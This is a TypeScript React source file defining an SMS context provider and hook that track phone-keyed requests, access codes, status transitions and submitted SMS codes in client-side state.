
import { createContext, useContext, useState, ReactNode } from 'react';

type RequestStatus = 'pending' | 'activated' | 'sms_requested' | 'completed';

interface Request {
  phone: string;
  accessCode: string;
  status: RequestStatus;
  smsCode?: string;
}

interface SMSContextType {
  requests: Record<string, Request>;
  currentRequest: Request | null;
  submitRequest: (phone: string, accessCode: string) => void;
  activateRequest: (phone: string) => void;
  requestSMS: (phone: string) => void;
  submitSMSCode: (phone: string, smsCode: string) => void;
  getCurrentUserStatus: () => RequestStatus | null;
}

const SMSContext = createContext<SMSContextType | undefined>(undefined);

export const SMSProvider = ({ children }: { children: ReactNode }) => {
  const [requests, setRequests] = useState<Record<string, Request>>({});
  const [currentRequest, setCurrentRequest] = useState<Request | null>(null);

  const submitRequest = (phone: string, accessCode: string) => {
    const newRequest: Request = {
      phone,
      accessCode,
      status: 'pending',
    };
    
    setRequests((prev) => ({
      ...prev,
      [phone]: newRequest,
    }));
    
    setCurrentRequest(newRequest);
  };

  const activateRequest = (phone: string) => {
    if (requests[phone]) {
      const updatedRequest = {
        ...requests[phone],
        status: 'activated' as RequestStatus,
      };
      
      setRequests((prev) => ({
        ...prev,
        [phone]: updatedRequest,
      }));
      
      if (currentRequest && currentRequest.phone === phone) {
        setCurrentRequest(updatedRequest);
      }
    }
  };

  const requestSMS = (phone: string) => {
    if (requests[phone]) {
      const updatedRequest = {
        ...requests[phone],
        status: 'sms_requested' as RequestStatus,
      };
      
      setRequests((prev) => ({
        ...prev,
        [phone]: updatedRequest,
      }));
      
      if (currentRequest && currentRequest.phone === phone) {
        setCurrentRequest(updatedRequest);
      }
    }
  };

  const submitSMSCode = (phone: string, smsCode: string) => {
    if (requests[phone]) {
      const updatedRequest = {
        ...requests[phone],
        status: 'completed' as RequestStatus,
        smsCode,
      };
      
      setRequests((prev) => ({
        ...prev,
        [phone]: updatedRequest,
      }));
      
      if (currentRequest && currentRequest.phone === phone) {
        setCurrentRequest(updatedRequest);
      }
    }
  };

  const getCurrentUserStatus = () => {
    return currentRequest ? currentRequest.status : null;
  };

  return (
    <SMSContext.Provider
      value={{
        requests,
        currentRequest,
        submitRequest,
        activateRequest,
        requestSMS,
        submitSMSCode,
        getCurrentUserStatus,
      }}
    >
      {children}
    </SMSContext.Provider>
  );
};

export const useSMS = () => {
  const context = useContext(SMSContext);
  if (context === undefined) {
    throw new Error('useSMS must be used within a SMSProvider');
  }
  return context;
};
